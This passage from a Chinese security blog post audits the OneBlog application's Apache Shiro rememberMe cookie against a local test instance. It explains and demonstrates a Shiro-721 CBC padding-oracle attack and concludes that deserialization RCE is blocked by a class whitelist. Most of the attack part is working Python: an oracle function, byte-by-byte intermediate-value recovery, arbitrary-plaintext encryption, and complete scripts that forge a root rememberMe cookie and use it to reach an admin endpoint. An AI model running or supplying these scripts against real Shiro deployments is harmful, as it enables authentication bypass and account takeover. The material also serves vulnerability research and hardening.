+③ 触发器类   → resolveClass（白名单 ）AnnotationInvocationHandler 等全被拦
+</code></pre>
+<p><strong>最终结论：加密层（721）可打通，RCE 层（白名单）不可绕过。</strong><br>
+<strong>5最后给上加密层的Padding Oracle —— 代码与误区分析</strong></p>
+<h2 id="0-oracle-判据">0. Oracle 判据</h2>
+<pre><code>发送密文 = 合法rememberMe密文 + prefix块(16B) + 试探块(16B)
+
+服务端行为：
+- 解密成功 + 反序列化成功 → 续期 rememberMe → HTTP 200 + Set-Cookie: rememberMe=&lt;新值&gt;
+- 解密失败或反序列化失败 → forgetIdentity → HTTP 302 + Set-Cookie: rememberMe=deleteMe
+
+判定：
+  响应头中有 非deleteMe 的 rememberMe → padding 合法
+  响应头中只有 deleteMe            → padding 非法
+</code></pre>
+<h2 id="1-oracle-函数核心判据">1. Oracle 函数（核心判据）</h2>
+<pre><code class="language-python">import base64, re
+import requests
+
+URL = "http://127.0.0.1:8085/"
+raw = base64.b64decode(open('rememberMe.txt').read().strip())  # 合法密文
+
+def oracle_valid(prefix_bytes, block_bytes):
+    """返回 True 表示 padding 合法（解密成功 + 反序列化成功）"""
+    # 合法密文 + prefix + block
+    data = raw + prefix_bytes + block_bytes
+    cookie = base64.b64encode(data).decode()
+    
+    r = requests.get(URL, headers={'Cookie': 'rememberMe=' + cookie}, timeout=15)
+    set_cookie = r.headers.get('Set-Cookie', '')
+    vals = re.findall(r'rememberMe=([^;]+)', set_cookie)
+    
+    # 有非 deleteMe 的值 → padding 合法 + 反序列化成功
+    return any(v != 'deleteMe' for v in vals)
+</code></pre>
+<h2 id="2-中间值恢复bust--逐字节">2. 中间值恢复（bust —— 逐字节）</h2>
+<pre><code class="language-python">def bust(block):
+    """恢复 D(block) 的 16 字节中间值"""
+    block = bytes(block)
+    D = bytearray(16)
+    
+    for byte_num in range(15, -1, -1):         # 从最后一个字节往前
+        pad_val = 16 - byte_num                 # 当前期望的 padding 值
+        
+        # 构造 prefix：后面已恢复的字节设为正确 padding
+        prefix = bytearray(16)
+        for k in range(byte_num + 1, 16):
+            prefix[k] = D[k] ^ pad_val          # 让第 k 字节明文 = pad_val
+        
+        # 遍历 prefix[byte_num] 0-255，找 padding 合法的值
+        found = None
+        for guess in range(256):
+            prefix[byte_num] = guess
+            if oracle_valid(bytes(prefix), block):
+                found = guess
+                break
+        
+        if found is None:
+            raise Exception(f"byte {byte_num} 无解")
+        
+        D[byte_num] = found ^ pad_val           # 恢复的中间值字节
+        print(f"  byte {byte_num}: D=0x{D[byte_num]:02x}")
+    
+    return D
+</code></pre>
+<h2 id="3-加密任意明文encrypt">3. 加密任意明文（encrypt）</h2>
+<pre><code class="language-python">import os
+
+def encrypt(plaintext):
+    """通过 padding oracle 加密任意明文（CBC 模式）"""
+    # PKCS5 padding
+    pad = 16 - (len(plaintext) % 16)
+    plaintext = plaintext + bytes([pad]) * pad
+    
+    # 分块 P_0, P_1, ..., P_{m-1}
+    blocks = [plaintext[i:i+16] for i in range(0, len(plaintext), 16)]
+    m = len(blocks)
+    
+    # 随机选最后一块密文 C_m
+    C = [os.urandom(16)]
+    
+    # 从后往前逐块构造
+    for i in range(m - 1, -1, -1):
+        # 恢复 D(C_{i+1})
+        D_block = bust(C[0])
+        # 前一块 = D(C_{i+1}) XOR P_i
+        prev = bytes(a ^ b for a, b in zip(D_block, blocks[i]))
+        C.insert(0, prev)
+    
+    # C[0]=IV, C[1]=C_1, ..., C[m]=C_m
+    ciphertext = b''.join(C)
+    return ciphertext
+</code></pre>
+<h2 id="4-误区分析为什么篡改密文-oracle必须追加块">4. 误区分析：为什么"篡改密文"≠ Oracle，必须"追加块"</h2>
+<h3 id="41-错误姿势篡改合法密文自身">4.1 错误姿势：篡改合法密文自身</h3>
+<pre><code>发送密文 = IV' + C_1 + ... + C_n （IV 的某个字节被 XOR 篡改）
+
+解密：
+  P_1 = D(C_1) XOR IV'   ← IV 被篡改，P_1 第一个字节损坏
+  P_1[0] ≠ 0xAC（序列化魔术头损坏）
+
+反序列化：
+  readObject 第一步就读到损坏的魔术头 → StreamCorruptedException → SerializationException
+  → forgetIdentity → deleteMe
+</code></pre>
+<p><strong>结果：HTTP 302 + deleteMe</strong></p>
+<p>而 padding 错误的响应也是 HTTP 302 + deleteMe。</p>
+<p>→ <strong>误判：oracle 不可区分！</strong></p>
+<h3 id="42-正确姿势在合法密文后面追加块">4.2 正确姿势：在合法密文<strong>后面</strong>追加块</h3>
+<pre><code>发送密文 = 合法IV + C_1 + ... + C_n + prefix + 试探块
+           \__________ 合法密文 __________/  \__ 追加 __/
+
+解密：
+  P_1...P_n = 合法 SimplePrincipalCollection 序列化（448B）+ PKCS5 padding
+  P_{n+1}   = D(prefix) ⊕ C_n                ← 乱码
+  P_{n+2}   = D(试探块) ⊕ prefix              ← 乱码，但最后字节决定 padding 是否合法
+
+反序列化：
+  readObject 读 P_1...P_n → SimplePrincipalCollection 对象成功 → 返回
+  尾部 P_{n+1}, P_{n+2}（乱码）被忽略 ← ObjectInputStream 只读一个对象就停
+</code></pre>
+<p><strong>结果：padding 合法 → 反序列化成功 → 续期 → HTTP 200 + 新 cookie</strong><br>
+<strong>padding 非法 → 解密失败 → HTTP 302 + deleteMe</strong></p>
+<p>→ <strong>正确判定：oracle 可区分！</strong></p>
+<h3 id="43-关键机制objectinputstream-只读一个对象就停">4.3 关键机制：ObjectInputStream 只读一个对象就停</h3>
+<pre><code>明文流：[SimplePrincipalCollection序列化448B][padding 16B][乱码][乱码+合法padding]
+         ← readObject 读第一个对象 →
+         ← 448B 处返回，后面不读 →
+</code></pre>
+<p><strong>篡改密文破坏了第一个对象 → 反序列化失败。追加块不影响第一个对象 → 反序列化成功。</strong></p>
+<h3 id="44-对比表">4.4 对比表</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>篡改合法密文</th>
+<th>追加块</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一个对象完整性</td>
+<td>❌ 破坏</td>
+<td>✅ 完整</td>
+</tr>
+<tr>
+<td>反序列化结果</td>
+<td>StreamCorruptedException</td>
+<td>SimplePrincipalCollection 成功</td>
+</tr>
+<tr>
+<td>padding 合法时 HTTP</td>
+<td>302 + deleteMe</td>
+<td><strong>200 + 新 cookie</strong></td>
+</tr>
+<tr>
+<td>padding 非法时 HTTP</td>
+<td>302 + deleteMe</td>
+<td>302 + deleteMe</td>
+</tr>
+<tr>
+<td>oracle 可区分</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<h2 id="5-完整攻击脚本身份伪造">5. 完整攻击脚本（身份伪造）</h2>
+<pre><code class="language-python"># 1. 构造恶意明文（伪造 root 用户）
+# Java 序列化: SimplePrincipalCollection(1L, "com.zyd.blog.core.shiro.realm.ShiroRealm_0")
+# 457 字节 → padding 7 字节 → 464 字节 = 29 块
+
+plaintext = base64.b64decode(
+    "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29s"
+    ...
+    "bGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9N"
+    ...
+)
+
+# 2. padding oracle 加密
+ciphertext = encrypt(plaintext)
+
+# 3. 伪造的 rememberMe
+forged_cookie = base64.b64encode(ciphertext).decode()
+
+# 4. 发送，以 root 身份访问后台
+r = requests.get('http://127.0.0.1:8085/roles',
+                 headers={'Cookie': 'rememberMe=' + forged_cookie})
+# HTTP 200 ← 身份伪造成功
+</code></pre>
+<h2 id="6-为什么追加块的-oracle-需要-256-次请求恰好找到-1-个解">6. 为什么"追加块"的 oracle 需要 256 次请求恰好找到 1 个解</h2>
+<pre><code>D(试探块) XOR prefix = 最后块明文
+D(试探块)[15] XOR prefix[15] = 最后块明文[15]
+
+遍历 prefix[15] 0-255：
+  → D(试探块)[15] XOR prefix[15] 遍历 0-255 的某个排列
+  → 恰好一个 prefix[15] 使最后块明文[15] = 0x01（合法 padding）
+
+实测：
+  D(0x00...00) 未恢复前，prefix[15]=185 唯一使 padding 合法
+  恢复后验证：D(0)[15] = 185 XOR 0x01 = 184 = 0xB8 ✓
+</code></pre>
+<p><strong>思考最后一个问题：handler 绕过有没有可能</strong></p>
+<pre><code>cd /g/pi/audit &amp;&amp; echo "=== 确认：JDK8 中 InvocationHandler 的 Serializable 实现（白名单内有无）===" &amp;&amp; SHIRO_JAR="$HOME/.m2/repository/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar"; SLF4J="$HOME/.m2/repository/org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar"; SLF4J_SIMPLE="$HOME/.m2/repository/org/slf4j/slf4j-simple/1.7.5/slf4j-simple-1.7.5.jar"; CP="/g/pi/zhangyd-c-OneBlog-e0a0cc8/blog-admin/target/classes:/g/pi/audit:$SHIRO_JAR:$SLF4J:$SLF4J_SIMPLE"; cat &gt; HandlerAudit.java &lt;&lt; 'EOF'
+import java.lang.reflect.InvocationHandler;
+import java.io.Serializable;
+
+public class HandlerAudit {
+    public static void main(String[] args) throws Exception {
+        // 枚举 JDK 中已知的 InvocationHandler 实现，检查它们是否在白名单内
+        String[] candidates = {
+            "sun.reflect.annotation.AnnotationInvocationHandler",
+            "java.rmi.server.RemoteObjectInvocationHandler",
+            "com.sun.jmx.mbeanserver.MBeanInstantiator",
+            "org.springframework.aop.framework.JdkDynamicAopProxy",
+            "java.lang.reflect.Proxy",  // Proxy 本身实现了 InvocationHandler? 不，它是接口创建者
+        };
+        for (String c : candidates) {
+            try {
+                Class&lt;?&gt; cl = Class.forName(c);
+                boolean isHandler = InvocationHandler.class.isAssignableFrom(cl);
+                boolean isSer = Serializable.class.isAssignableFrom(cl);
+                boolean inWhitelist = c.startsWith("java.lang") || c.startsWith("java.util") || c.startsWith("org.apache.shiro.subject.");
+                System.out.println(c);
+                System.out.println("  是InvocationHandler实现=" + isHandler + " 可序列化=" + isSer + " 在白名单=" + inWhitelist);
+            } catch (Throwable t) {
+                System.out.println(c + " =&gt; 类不存在或加载失败");
+            }
+        }
+    }
+}
+EOF
+"D:/java envirmonent/jdk1.8.0_74/bin/javac.exe" -encoding utf-8 -cp "$CP" HandlerAudit.java 2&gt;&amp;1 | head &amp;&amp; "D:/java envirmonent/jdk1.8.0_74/bin/java.exe" -Dfile.encoding=UTF-8 -cp "$CP" HandlerAudit 2&gt;&amp;1
+</code></pre>
+<pre><code>=== 确认：JDK8 中 InvocationHandler 的 Serializable 实现（白名单内有无）===
+sun.reflect.annotation.AnnotationInvocationHandler
+  是InvocationHandler实现=true 可序列化=true 在白名单=false
+java.rmi.server.RemoteObjectInvocationHandler
+  是InvocationHandler实现=true 可序列化=true 在白名单=false
+com.sun.jmx.mbeanserver.MBeanInstantiator
+  是InvocationHandler实现=false 可序列化=false 在白名单=false
+org.springframework.aop.framework.JdkDynamicAopProxy =&gt; 类不存在或加载失败
+java.lang.reflect.Proxy
+  是InvocationHandler实现=false 可序列化=true 在白名单=true
+</code></pre>
+<p>实证确认了 handler 绕过的死结。给出完整分析。</p>
+<h2 id="handler-绕过--审计结论">handler 绕过 — 审计结论</h2>
+<h3 id="核心障碍白名单内不存在-invocationhandler-实现">核心障碍：白名单内不存在 InvocationHandler 实现</h3>
+<p>实测 JDK 8 所有 <code>InvocationHandler</code> 实现：</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>是 handler</th>
+<th>可序列化</th>
+<th>在白名单</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sun.reflect.annotation.AnnotationInvocationHandler</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>❌ <code>sun.reflect</code> 开头</td>
+</tr>
+<tr>
+<td><code>java.rmi.server.RemoteObjectInvocationHandler</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>❌ <code>java.rmi</code> 开头</td>
+</tr>
+<tr>
+<td><code>java.lang.reflect.Proxy</code></td>
+<td>❌ 不是</td>
+<td>✅</td>
+<td>✅ 但在白名单</td>
+</tr>
+</tbody>
+</table>
+<p><strong>结论：<code>java.lang</code> / <code>java.util</code> / <code>org.apache.shiro.subject.*</code> 白名单内，没有任何一个 <code>InvocationHandler</code> 实现类。</strong> handler 这一环在类名层面就是死路。</p>
+<h3 id="proxy-反序列化的完整链需要三环全被拦">Proxy 反序列化的完整链需要三环，全被拦</h3>
+<pre><code>Proxy(Templates接口, EvilHandler)
+        │
+        ├─ ① 接口 Templates ──→ resolveProxyClass（未重写，绕过 ）
+        │                      但 Class.forName(iface, false, ...) 不执行代码，无 RCE
+        │
+        ├─ ② handler EvilHandler ──→ resolveClass（白名单硬检查 ）
+        │                            白名单内无 InvocationHandler 实现 → 必拦
+        │
+        └─ ③ 触发器（调用接口方法）──→ AnnotationInvocationHandler 等
+                                      sun.reflect / java.beans / org.apache.* → 全被拦 
+</code></pre>
+<h3 id="逐条排除-handler-绕过思路">逐条排除 handler 绕过思路</h3>
+<table>
+<thead>
+<tr>
+<th>绕过思路</th>
+<th>为何失败</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>用白名单内的 handler</td>
+<td>白名单内<strong>无</strong> InvocationHandler 实现（已实证）</td>
+</tr>
+<tr>
+<td>接口加载触发 RCE</td>
+<td><code>Class.forName(iface, false)</code> 不初始化类；<code>Proxy.getProxyClass</code> 只生成字节码，不执行代码</td>
+</tr>
+<tr>
+<td>handler 类名伪装成 <code>java.lang.*</code></td>
+<td><code>ClassUtils.forName(伪装名)</code> 加载失败（类不存在）</td>
+</tr>
+<tr>
+<td>handler 用 <code>TC_REFERENCE</code> 引用已加载类</td>
+<td>只能引用本会话已过白名单的类，引入不了新恶意类</td>
+</tr>
+<tr>
+<td>handler 设 <code>null</code>（TC_NULL）</td>
+<td>反序列化能过，但 <code>h=null</code>，调用接口方法时 NPE，不是 RCE</td>
+</tr>
+<tr>
+<td>handler 字段类型欺骗</td>
+<td><code>h</code> 字段声明类型是 <code>InvocationHandler</code>，赋非 handler 对象 → ClassCastException</td>
+</tr>
+<tr>
+<td>组合 Proxy + 白名单类拼 handler</td>
+<td>Proxy 本身不是 <code>InvocationHandler</code> 实现，无法作为 handler</td>
+</tr>
+</tbody>
+</table>
+<h3 id="最终定论">最终定论</h3>
+<p><strong>handler 无法绕过。</strong> Proxy 反序列化链在 OneBlog 白名单下被三重阻断：</p>
+<ol>
+<li><strong>接口旁路（resolveProxyClass）</strong>：唯一真实的旁路，但只加载接口类型、不执行任何代码，无法单独 RCE</li>
+<li><strong>handler（resolveClass）</strong>：白名单内不存在 InvocationHandler 实现，硬拦截</li>
+<li><strong>触发器类</strong>：<code>AnnotationInvocationHandler</code>、<code>BeanComparator</code> 等全部在白名单外，硬拦截</li>
+</ol>
+<h3 id="完整攻击面最终结论">完整攻击面最终结论</h3>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shiro-550（默认 key）</td>
+<td>随机密钥</td>
+</tr>
+<tr>
+<td>Shiro-721 padding oracle（加密层）</td>
+<td><strong>可打通</strong>（oracle 可区分，中间值可恢复）</td>
+</tr>
+<tr>
+<td>反序列化 RCE（白名单层）</td>
+<td><strong>无法绕过</strong>（gadget 类、handler、触发器全被拦）</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>唯一需要补的加固点是 <code>resolveProxyClass</code> 未重写（接口能绕过加载）。但即便补上，也只是堵住一个"理论旁路"——它目前本身就不构成 RCE。真正的安全边界是 <code>resolveClass</code> 的白名单，这一层是硬的，handler 和所有 gadget 都过不去。</p>
+</blockquote>
+<pre><code>import base64, re, os, time, json
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+URL = "http://127.0.0.1:8085/"
+raw = base64.b64decode(open('rememberMe.txt').read().strip())
+plaintext = base64.b64decode(open('forge_plain.b64').read().strip())
+
+# padding
+pad = 16 - (len(plaintext) % 16)
+plaintext = plaintext + bytes([pad]) * pad
+blocks = [plaintext[i:i+16] for i in range(0, len(plaintext), 16)]
+m = len(blocks)
+print(f"明文 {len(plaintext)} 字节 = {m} 块")
+
+session = requests.Session()
+
+def oracle_valid(prefix, block):
+    data = raw + bytes(prefix) + bytes(block)
+    cookie = base64.b64encode(data).decode()
+    session.cookies.clear()
+    r = session.get(URL, headers={'Cookie': 'rememberMe=' + cookie}, timeout=15)
+    sc = r.headers.get('Set-Cookie', '')
+    vals = re.findall(r'rememberMe=([^;]+)', sc)
+    return any(v != 'deleteMe' for v in vals)
+
+def bust(block, label=""):
+    block = bytes(block)
+    D = bytearray(16)
+    pool = ThreadPoolExecutor(max_workers=8)
+    for byte_num in range(15, -1, -1):
+        pad_val = 16 - byte_num
+        def check(guess):
+            prefix = bytearray(16)
+            for k in range(byte_num+1, 16):
+                prefix[k] = D[k] ^ pad_val
+            prefix[byte_num] = guess
+            return guess, oracle_valid(bytes(prefix), block)
+        futures = [pool.submit(check, g) for g in range(256)]
+        goods = []
+        for f in as_completed(futures):
+            g, ok = f.result()
+            if ok:
+                goods.append(g)
+        if not goods:
+            raise Exception(f"{label} byte {byte_num} 无解")
+        D[byte_num] = goods[0] ^ pad_val
+        print(f"  {label} byte{byte_num} D={D[byte_num]:#04x} 候选{len(goods)}", flush=True)
+    pool.shutdown()
+    return D
+
+C = [os.urandom(16)]  # 初始 C_m
+result = bytearray(C[0])
+t0 = time.time()
+for i in range(m-1, -1, -1):
+    label = f"[块{i}/{m-1}]"
+    D_block = bust(C[0], label)
+    prev = bytes(a ^ b for a, b in zip(D_block, blocks[i]))
+    C.insert(0, prev)
+    result = bytes(prev) + bytes(result)
+    # checkpoint
+    open(f'checkpoint_{i}.bin','wb').write(bytes(result))
+
+ct = b''.join(C)
+cookie = base64.b64encode(ct).decode()
+open('forge_cookie.txt','w').write(cookie)
+print(f"\n完成! 耗时 {time.time()-t0:.1f}s, cookie长度 {len(cookie)}", flush=True)
+</code></pre>
+<p>伪造身份验证poc</p>
+
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-11-13 22:02">2026-11-13 22:01</span>&nbsp;
+<a href="https://www.cnblogs.com/nihao-xing">你好，星</a>&nbsp;
+阅读(<span id="post_view_count">55</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(23645410);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fnihao-xing%2Fp%2F23645410&amp;targetId=23645410&amp;targetType=0" target="_blank">举报</a>
+</div>
+        
